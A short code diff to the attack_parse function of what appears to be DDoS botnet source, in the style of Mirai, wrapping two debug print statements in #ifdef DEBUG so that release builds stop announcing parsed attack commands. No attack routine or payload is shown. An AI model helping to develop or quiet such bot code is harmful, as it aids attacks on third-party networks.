@@ -132,9 +132,11 @@ void attack_parse(char *buf, int len)
     struct attack_target *targs = NULL;
     struct attack_option *opts = NULL;
 
+#ifdef DEBUG
     // Simple test to see if function is called
     printf("[ATTACK_PARSE] FUNCTION CALLED!\n");
     fflush(stdout);
+#endif
 
 #ifdef DEBUG
     printf("[ATTACK_PARSE] === START ===\n");
@@ -294,8 +296,10 @@ void attack_parse(char *buf, int len)
     fflush(stdout);
     debug_logf("=== ATTACK_PARSE COMPLETE ===\n");
     log_attack_details(duration, vector, targs_len, targs, opts_len, opts);
+#ifdef DEBUG
     printf("[ATTACK_PARSE] Calling attack_start()...\n");
     fflush(stdout);
+#endif
     debug_logf("Calling attack_start()...\n");
 #endif
     errno = 0;
